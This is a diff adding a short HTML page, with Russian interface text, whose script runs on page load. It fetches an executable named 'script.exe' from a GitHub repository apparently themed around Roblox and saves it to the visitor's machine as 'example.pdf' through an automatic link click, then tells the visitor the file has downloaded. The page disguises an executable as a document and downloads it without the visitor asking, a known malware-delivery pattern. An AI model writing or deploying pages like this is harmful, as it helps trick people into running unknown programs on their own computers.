@@ -1,0 +1,22 @@
+``html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Скачайте файл</title>
+    <script>
+        // Скачиваем файл (замените "example.pdf" на ваш файл)
+        fetch("https://github.com/fasfsagfsa13-del/roblo1x-souresec/blob/main/script.exe")
+            .then(response => response.blob())
+            .then(blob => {
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = "example.pdf";
+                document.body.appendChild(link);
+                link.click();
+                alert("Файл скачан! Проверьте папку 'Загрузки'.");
+            });
+    </script>
+</head>
+<body>Скачивание файла...</body>
+</html>
+```
